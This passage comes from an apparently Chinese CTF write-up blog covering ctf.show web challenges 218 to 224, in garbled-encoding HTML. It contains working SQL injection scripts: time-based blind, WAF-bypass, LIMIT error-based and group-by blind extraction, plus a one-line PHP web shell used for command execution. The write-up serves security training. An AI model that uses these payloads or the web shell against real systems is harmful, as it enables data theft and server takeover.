plaintext"><table><tr><td class="code"><pre><span class="line">ip=0)||if((ascii(substr((select database()),1,1))&lt;100),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&amp;debug=1</span><br></pre></td></tr></table></figure><p>ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eba89dba-b139-4154-b319-62a66a78c3eb.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxc,ctfshow_info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flagaac,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;5456333f-bac9-48eb-b262-4e1eaf38fe0a&#125;  </span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;0)||if((ascii(substr((select group_concat(flagaac)from ctfshow_flagxc),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åˆ©ç”¨<code>rlike</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span><br></pre></td></tr></table></figure><h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>ç¦ç”¨äº†<code>rlike</code>ï¼Œä½¿ç”¨ç¬›å¡å°”ç§¯å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c27f8fcf-6c42-426b-af89-449cbd4f7769.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxca,ctfshow_info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flagaabc,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;3adf6005-ec81-4a42-8e06-7adbb42c6c11&#125;  </span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;0)||if((ascii(substr((select group_concat(flagaabc)from ctfshow_flagxca),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure><h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><p>ç¦ç”¨äº†ä¸€äº›å­—ç¬¦ï¼ŒåŸæ¥çš„<code>substr</code>ç”¨ä¸äº†äº†</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥ç”¨<code>left</code>ï¼Œæ³¨æ„<code>concat</code>è¢«ç¦ç”¨äº†ï¼Œå€ŸåŠ©ä¸‹<code>limit</code>å°±å¥½</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-&#125;&#123;_&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35be7a51-5a9f-4590-9d07-9f14166e0779.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((left((select database()),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxcac</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((left((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å flagaabcc</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;8e25fbd7-907b-44f6-a6b3-f350261adcce&#125;  </span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;0)||if((left((select flagaabcc from ctfshow_flagxcac limit 0,1),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;flag+j&#125;</span>&#x27;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨<code>right</code>å’Œ<code>left</code>çš„ç»„åˆæ‹³ï¼Œæ¯”å¦‚<code>right(left((&quot;evo1&quot;),3),1)</code>ç­‰æ•ˆäº<code>substr(&quot;evo1&quot;,3,1)</code>ï¼Œç„¶åç”¨<code>ord</code>æ›¿æ¢<code>ascii</code>å³å¯</p><h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">  <span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user <span class="title function_ invoke__">limit</span> (<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$limit</span>,<span class="variable">$limit</span>;</span><br></pre></td></tr></table></figure><p>å‚è€ƒè¿™ç¯‡<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">[è½¬è½½]Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•</a>ï¼Œç‰ˆæœ¬é™åˆ¶(5.0.0-5.6.6)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?&amp;page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</span><br></pre></td></tr></table></figure><h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><p><code>group by</code>ç›²æ³¨</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user group by <span class="variable">$username</span>;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•åå‘ç°å‚æ•°<code>u</code>è¿”å›å­˜åœ¨å·®å¼‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?u=if(2&gt;1,username,0)</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;,&#123;&quot;id&quot;:&quot;2&quot;,&quot;username&quot;:&quot;user1&quot;,&quot;pass&quot;:&quot;111&quot;&#125;,&#123;&quot;id&quot;:&quot;3&quot;,&quot;username&quot;:&quot;user2&quot;,&quot;pass&quot;:&quot;222&quot;&#125;,&#123;&quot;id&quot;:&quot;4&quot;,&quot;username&quot;:&quot;userAUTO&quot;,&quot;pass&quot;:&quot;passwordAUTO&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">/api/?u=if(2&lt;1,username,0)</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><p>æ•…å¯ä»¥è¿›è¡Œç›²æ³¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-&#125;&#123;_,&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ace49909-4b0b-497d-99b9-a29fd0b2b99a.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">        <span class="comment"># æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((left((select database()),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),username,0)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¡¨ ctfshow_flaga,ctfshow_user</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),username,0)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ— id,flagaabc,info</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),username,0)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ctfshow&#123;6eacd2b3-fbf3-44de-8701-f3263fcae9a8&#125;</span></span><br><span class="line">        payload = <span class="string">f&quot;?u=if((left((select group_concat(flagaabc) from ctfshow_flaga),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;flag+j&#125;</span>&#x27;),username,0)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">        response = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;passwordAUTO&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯<code>group by</code>æŠ¥é”™æ³¨å…¥ï¼ŒåŸç†å¯ä»¥çœ‹è¿™ç¯‡<a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">CTF-sql-mysql group byæŠ¥é”™æ³¨å…¥</a>ï¼Œä½†å‘ç°è¿˜æ˜¯è¦ç›²æ³¨ï¼Œè€Œä¸”è¦æ³¨æ„è¿‡æ»¤äº†æ•°å­—ï¼ˆå¯ä»¥ç”¨ä¸å¯è§å­—ç¬¦çš„<code>ascii</code>å€¼ï¼Œä¹Ÿå¯ä»¥æ‹¼æ¥<code>true</code>ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;ascii(&#x27;%0<span class="subst">&#123;num&#125;</span>&#x27;)&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> num &lt;<span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;concat(ascii(&#x27;%0<span class="subst">&#123;<span class="built_in">str</span>(num)[<span class="number">0</span>]&#125;</span>&#x27;),ascii(&#x27;%0<span class="subst">&#123;<span class="built_in">str</span>(num)[<span class="number">1</span>]&#125;</span>&#x27;))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;concat(ascii(&#x27;%0<span class="subst">&#123;<span class="built_in">str</span>(num)[<span class="number">0</span>]&#125;</span>&#x27;),ascii(&#x27;%0<span class="subst">&#123;<span class="built_in">str</span>(num)[<span class="number">1</span>]&#125;</span>&#x27;),ascii(&#x27;%0<span class="subst">&#123;<span class="built_in">str</span>(num)[<span class="number">2</span>]&#125;</span>&#x27;))&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fc374013-4449-4e78-bcab-42593e62a39b.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((ascii(substr((select database()),&#123;div(i)&#125;,true))&lt;&#123;div(mid)&#125;),username,false)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#è¡¨å ctfshow_flagas,ctfshow_user </span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;div(i)&#125;,true))&lt;&#123;div(mid)&#125;),username,false)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#åˆ—å id,flagasabc,info</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;div(i)&#125;,true))&lt;&#123;div(mid)&#125;),username,false)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ctfshow&#123;057db10a-06b4-47b7-a0a4-3467503fe372&#125;</span></span><br><span class="line">        payload = <span class="string">f&quot;?u=if((ascii(substr((select group_concat(flagasabc)from ctfshow_flagas),<span class="subst">&#123;div(i)&#125;</span>,true))&lt;<span class="subst">&#123;div(mid)&#125;</span>),username,false)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">        response = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;passwordAUTO&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><p>è®¿é—®<code>/robots.txt</code>å‘ç°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /pwdreset.php</span><br></pre></td></tr></table></figure><p>è®¿é—®é¡µé¢é‡ç½®ç®¡ç†å‘˜å¯†ç åç™»å½•å‘ç°æ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œè¿™ä¸ªæ³¨å…¥æ¯”è¾ƒå°‘è§ï¼Œç”¨ç¾¤é‡Œçš„<code>payload.bin</code>å³å¯ï¼Œæ–‡ä»¶å¤´éƒ¨æœ‰<code>sql</code>æ³¨å…¥å‘½ä»¤</p><p><img src="https://cdnjson.com/images/2023/02/08/web224.png" alt="web224.png"></p><p>åˆ›å»ºäº†<code>1.php</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œå³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/1.php?1=cat /flag</span><br></pre></td></tr></table></figure><p>ä¸‹è½½<code>upload.php</code>æºç çœ‹äº†ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>]&gt;<span class="number">10</span>*<span class="number">1024</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;æ–‡ä»¶è¿‡å¤§: &quot;</span> .(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">  <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>))).<span class="string">&quot;.zip&quot;</span>;</span><br><span class="line">      <span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>,<span class="variable">$filetype</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="variable">$filepath</span> = <span class="string">&quot;upload/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span 